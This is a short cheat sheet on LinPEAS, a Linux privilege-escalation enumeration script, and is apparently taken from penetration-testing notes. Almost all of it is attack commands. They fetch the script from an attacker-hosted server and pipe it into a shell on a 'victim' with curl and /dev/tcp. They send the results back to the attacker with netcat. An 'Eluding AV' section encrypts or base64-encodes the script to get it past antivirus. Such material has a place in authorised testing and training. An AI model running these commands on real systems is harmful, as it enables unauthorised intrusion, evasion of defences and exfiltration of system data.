## LinPEAS 
LinPEAS (Linux Privilege Escalation Awesome Script) is a script written in BASH that is used to enumerate information in a Linux system that is relevant for privilege escalation. 

It's designed to be executed on the target system and generate a thoroughly detailed report for the attacker to identify candidate routes for upward movement. Moreover, LinPEAS can be used by system administrators and other blue team staff to identify the most critical areas that require hardening.

### Download LinPEAS

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```
### Execute the script (recommended `-a` and `-r` flags for thoroughness)
```
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh -a -r | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh -a -r #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh -a -r | sh | nc 10.10.14.20 9002 #Victim
```
### Output to file
```
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```
### Eluding AV
```
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```
